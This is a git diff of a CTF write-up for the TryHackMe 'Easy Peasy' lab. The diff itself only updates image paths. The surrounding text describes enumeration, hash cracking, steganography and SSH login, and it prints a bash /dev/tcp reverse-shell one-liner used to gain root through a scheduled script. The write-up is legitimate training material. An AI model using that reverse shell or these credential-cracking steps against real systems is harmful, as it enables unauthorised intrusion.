@@ -70,12 +70,12 @@ The nmap scan reveals the following open ports:
 
 Navigating to ``http://10.10.193.198`` leads us to a generic nginx landing page.
 
-![tryhackmewriteup](1.png)
+![tryhackmewriteup](/assets/images/1.png)
 
 Viewing the page source code doesn't lead us anywhere, there are no clues or hints.
 We can check the /robots.txt as discovered by our initial nmap scan.
 
-![tryhackmewriteup](/docs/assets/images/2.png)
+![tryhackmewriteup](/assets/images/2.png)
 
 No luck here either. Let's run a gobuster scan to try to enumerate sub-directories
 
@@ -92,15 +92,15 @@ gobuster dir -u 10.10.193.198 -w /usr/share/wordlists/dirbuster/directory-list-2
 
 After a little while we see a ``/hidden`` subdirectory
 
-![tryhackmewriteup](/docs/assets/images/3.png)
+![tryhackmewriteup](/assets/images/3.png)
 
 Navigating to `http://10.10.193.198/hidden` leads us to the following page
 
-![tryhackmewriteup](/docs/assets/images/4.png)
+![tryhackmewriteup](/assets/images/4.png)
 
 Viewing the page source doesn't reveal anything useful
 
-![tryhackmewriteup](/docs/assets/images/5.png)
+![tryhackmewriteup](/assets/images/5.png)
 
 Lets point out gobuster scan towards the `/hidden` subdirectory
 ````bash
@@ -108,15 +108,15 @@ gobuster dir -u 10.10.193.198/hidden -w /usr/share/wordlists/dirbuster/directory
 ````
 
 Our scan reveals another subdirectory, this one called `/whatever`
-![tryhackmewriteup](/docs/assets/images/6.png)
+![tryhackmewriteup](/assets/images/6.png)
 
 Navigating to `http://10.10.193.198/hidden/whatever/` reveals an image.
 
-![tryhackmewriteup](/docs/assets/images/7.png)
+![tryhackmewriteup](/assets/images/7.png)
 
 This seems to be a dead end...Let's take a look at the source code.
 
-![tryhackmewriteup](/docs/assets/images/8.png)
+![tryhackmewriteup](/assets/images/8.png)
 
 Ah! It seems like we've found a base64 encoded string.
 We have several options to decode it such as:
@@ -130,17 +130,17 @@ echo "base64_string_to_decode" | base64 -d
 
 Today we will be using CyberChef to decode it (as we'll also be using it later on)
 
-![tryhackmewriteup](/docs/assets/images/9.png)
+![tryhackmewriteup](/assets/images/9.png)
 After decoding it we get our first flag.
 - 2.1 Using GoBuster, find flag 1. **✓**
 
 Looking back at our initial nmap scan we notice that there was an unusual HTTP port open, port 65524. Heading over to `http://10.10.193.198:65524` leads us to an Apache 2 landing page.
 
-![tryhackmewriteup](/docs/assets/images/10.png)
+![tryhackmewriteup](/assets/images/10.png)
 
 Everything seems like a normal Apache 2 landing page but upon closer inspection we see that there's actually a flag in the text.
 
-![tryhackmewriteup](/docs/assets/images/11.png)
+![tryhackmewriteup](/assets/images/11.png)
 
 This is Flag 3.
 - 2.3 Crack the hash with easypeasy.txt, What is the flag 3? **✓**  
@@ -154,16 +154,16 @@ gobuster dir -u http://10.10.193.198:65524/ -w /usr/share/wordlists/dirbuster/di
 
 Gobuster indicates the presence of a ``/robots.txt`` subdirectory, let's check it out
 
-![tryhackmewriteup](/docs/assets/images/12.png)
+![tryhackmewriteup](/assets/images/12.png)
 
 Interesting...the user-agent seems to be some sort of hash. Let's use `hash-identifier`, built into Kali, to try and figure out what  sort of hash we're working with.
 
-![tryhackmewriteup](/docs/assets/images/13.png)
+![tryhackmewriteup](/assets/images/13.png)
 
 Seems to be an MD5 hash.
 There are several ways of cracking hashes. We could use an online service like ``https://crackstation.net/``, let's try that first.
 
-![tryhackmewriteup](/docs/assets/images/14.png)
+![tryhackmewriteup](/assets/images/14.png)
 
 No luck. Let's try cracking it locally using hashcat with the wordlist provided in the CTF.
 
@@ -176,7 +176,7 @@ hashcat –m 0 <REDACTED_HASH> -a 0 /home/thelant3rn/CTFs/easy_peasy/easypeasy.t
 
 This didn't work either...hmm...we'll need to dig around a little further. Let's try looking up the hash using a search engine.
 
-![tryhackmewriteup](/docs/assets/images/15.png)
+![tryhackmewriteup](/assets/images/15.png)
 
 Success! We manage to find Flag 2.
 - 2.2 Further enumerate the machine, what is flag 2?**✓**
@@ -184,22 +184,22 @@ Success! We manage to find Flag 2.
 
 Let's take a step back and have a look at the Apache 2 landing page's source code. There's something interesting on line 194
 
-![tryhackmewriteup](/docs/assets/images/16.png)
+![tryhackmewriteup](/assets/images/16.png)
 
 `its encoded with ba....:REDACTED`
 
 It hints at the string being encoded with ``ba....``, do they mean Base64? Let's head over to CyberChef.
 
-![tryhackmewriteup](/docs/assets/images/17.png)
+![tryhackmewriteup](/assets/images/17.png)
 
 After some trial and error we discover the string is encoded using Base62. The decoded string seems to be a subdirectory. Upon checking we find out that it is indeed the hidden subdirectory.
 - 2.4 What is the hidden directory? **✓**
 
-![tryhackmewriteup](/docs/assets/images/18.png)
+![tryhackmewriteup](/assets/images/18.png)
 
 There doesn't seem to be much here at first glance. Let's have a look at the source code.
 
-![tryhackmewriteup](/docs/assets/images/19.png)
+![tryhackmewriteup](/assets/images/19.png)
 
 I noticed two interesting things. We have the first image to be hosted at our target IP `http://10.10.193.198:65524/REDACTED/binarycodepixabay.jpg` . The other images so far have been hosted on `cdn.pixabay.com` . It's worth downloading and inspecting.
 The second interesting thing is the string `9******REDACTED********81` . Could this be a hash?
@@ -207,10 +207,10 @@ The second interesting thing is the string `9******REDACTED********81` . Could t
 Let's firstly download the .jpg file using:
 ``wget http://10.10.193.198:65524/REDACTED/binarycodepixabay.jpg``
 
-![tryhackmewriteup](/docs/assets/images/20.png)
+![tryhackmewriteup](/assets/images/20.png)
 
 Now that we've downloaded the image let's have a look at the string. We'll be, once again, using ``hash-identifier``
-![tryhackmewriteup](/docs/assets/images/21.png)
+![tryhackmewriteup](/assets/images/21.png)
 It's most likely a SHA-256 hash. Let's try cracking it with the previous wordlist (provided by the CTF)
 
 ```bash
@@ -226,13 +226,13 @@ No luck cracking it using hashcat, let's try John the Ripper instead.
 sudo john --format=GOST hash.txt --wordlist=easypeasy.txt
 ```
 
-![tryhackmewriteup](/docs/assets/images/22.png)
+![tryhackmewriteup](/assets/images/22.png)
 
 Success!
 - 2.5 Using the wordlist that provided to you in this task crack the hash what is the password?**✓**
 
 
-![tryhackmewriteup](/docs/assets/images/23.png)
+![tryhackmewriteup](/assets/images/23.png)
 (Alternatively we could have also used https://md5hashing.net as previously)
 
 
@@ -242,15 +242,15 @@ Let's go back and take a look at the ``.jpg`` file we downloaded earlier. I'll r
 steghide extract -sf binarycodepixabay.jpg
 ```
 
-![tryhackmewriteup](/docs/assets/images/24.png)
+![tryhackmewriteup](/assets/images/24.png)
 
 It worked! Let's have a look at "secrettext.txt"
 
-![tryhackmewriteup](/docs/assets/images/25.png)
+![tryhackmewriteup](/assets/images/25.png)
 
 We have a username `boring` and a password that seems to be in binary. Let's head over to CyberChef once more.
 
-![tryhackmewriteup](/docs/assets/images/26.png)
+![tryhackmewriteup](/assets/images/26.png)
 
 It worked, now we have a username and password.
 - 2.6 What is the password to login to the machine via SSH? **✓**
@@ -262,7 +262,7 @@ Let's SSH into the target IP using these credentials. From our initial nmap scan
 ssh -p 6498 boring@<TARGET_IP>
 ```
 
-![tryhackmewriteup](/docs/assets/images/27.png)
+![tryhackmewriteup](/assets/images/27.png)
 
 We're in! Using the `ls` command we see there's a `user.txt` file
 
@@ -277,7 +277,7 @@ synt{REDACTED}
 
 We have a flag but it seems to be using some sort of rotation. Heading over to CyberChef we can try and rotate it back to normal.
 
-![tryhackmewriteup](/docs/assets/images/28.png)
+![tryhackmewriteup](/assets/images/28.png)
 
 It was using ROT13, we now have the user flag.
 - 2.7 What is the user flag?**✓**
@@ -340,7 +340,7 @@ listening on [any] 4444 ...
 
 We add the following reverse shell script:
 `bash -i >& /dev/tcp/YOUR_IP_ADDRESS/SAME_PORT_AS_LISTENER 0>&1` into the script, save it, wait for it to run for our listener to receive the incoming connection.
-![tryhackmewriteup](/docs/assets/images/29.png)
+![tryhackmewriteup](/assets/images/29.png)
 
 Shortly after we have a reverse shell with root access.
 
